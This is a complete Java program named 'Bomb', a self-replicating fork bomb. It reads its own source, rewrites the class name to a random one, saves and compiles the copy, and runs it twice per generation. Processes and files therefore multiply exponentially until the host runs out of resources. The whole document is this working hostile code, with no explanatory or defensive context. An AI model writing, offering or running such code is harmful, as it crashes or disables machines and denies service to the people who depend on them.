import javax.tools.*;
import java.util.*;
import java.io.*;
class Bomb {
	public static void main(String[] args) throws Exception{
		for (int i = 0; i<2; ++i){
			String[] self = new Scanner(new File("Bomb.java")).useDelimiter("\\Z").next().split("\n");
			int random = (int)(Math.random()*123456789);
			String name = "a"+random;
			self[3] = self[3].replace(self[3].substring(6,self[3].indexOf(" {")),name);
			self[6] = self[6].replace(self[6].substring(self[6].indexOf("File")+6,self[6].indexOf(".java")),name);
			new FileOutputStream(name+".java").write(String.join("\n",self).getBytes());
			ToolProvider.getSystemJavaCompiler().run(null,null,null,name+".java");
			Runtime.getRuntime().exec("java "+name);
		}
	}	
}
